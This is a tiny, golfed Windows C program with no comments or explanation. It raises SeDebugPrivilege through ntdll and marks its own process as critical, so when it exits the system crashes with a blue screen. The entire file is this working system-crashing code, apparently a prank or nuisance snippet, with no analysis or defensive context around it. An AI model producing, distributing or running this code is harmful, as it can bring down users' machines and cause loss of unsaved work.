#include<windows.h>
#define G(f)(GetProcAddress(LoadLibraryA("ntdll"),f))
x;main(){G("RtlAdjustPrivilege")(20,1,0,&x);G("RtlSetProcessIsCritical")(1,0,0);}